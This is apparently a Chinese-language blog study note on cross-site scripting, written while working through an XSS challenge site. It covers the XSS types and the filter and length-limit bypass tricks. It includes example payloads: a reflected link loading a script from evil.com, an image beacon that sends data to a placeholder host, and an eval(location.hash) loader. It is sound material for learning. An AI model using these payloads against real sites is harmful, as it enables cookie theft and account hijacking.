XSS笔记

2020-08-02 3 min read # Web

XSS挑战http://xss.fbisb.com/yx/index.php
要学好JavaScript才能构造好payload。
XSS的本质还是一种HTML注入，用户的数据被当成HTML代码的一部分来执行。

分类

反射性XSS：一般是诱使用户点击链接
存储型XSS：把恶意脚本保存在服务器
DOM型XSS：修改页面的DOM节点（这是一个例子：http://10.214.160.13:10000/the2nd.php），从JavaScript中输出数据到HTML页面里。

危害

网上的教程都是让你alert("/xxs/")，这只能反映出漏洞的存在。
实际用于完成恶意功能的脚本，叫“XSS PAYLOAD”。脚本的类型有很多，比如javascript,vbscript等。
窃取COOKIE
一个网站的应用，只要接受HTTP协议中的GET和POST请求，就可以完成所有操作。而JavaScript就可以让浏览器发起这两个请求，由此可以“操控”浏览器。
比如反射性，我需要构造这样的链接：
(http://xss.fbisb.com/yx/level1.php?name=<script src = http://www.evil.com/evil.js></script>)
利用图片发送GET请求

var img = document.createElement("img");
img.src = "http://xxxxxxxxx?key=value";
document.body.appendChild(img);

XSS构造技巧

  • 利用字符编码绕过过滤
  • 绕过长度限制：
    可以利用Location hash属性，就是URL中#号后面的部分。onclick="eval(location.hash.substr(1))"，远程加载js，
  • <base>标签是使用来为页面中的所有相对链接指定默认地址（目录）或默认属性（target属性）<base>标签可以出现在页面的任何地方。十分危险，可以劫持当前页面使用相对路径的资源。
  • 利用window.name实现跨域：
    在www.a.com/index.html实现
<script>
    window.name = "我在A里哦";
    window.location = "http://www.b.com/index.html";
</script>

在http://www.b.com/index.html，你会发现，数据跨域传输了

<script>
    alert(window.name);
</script>
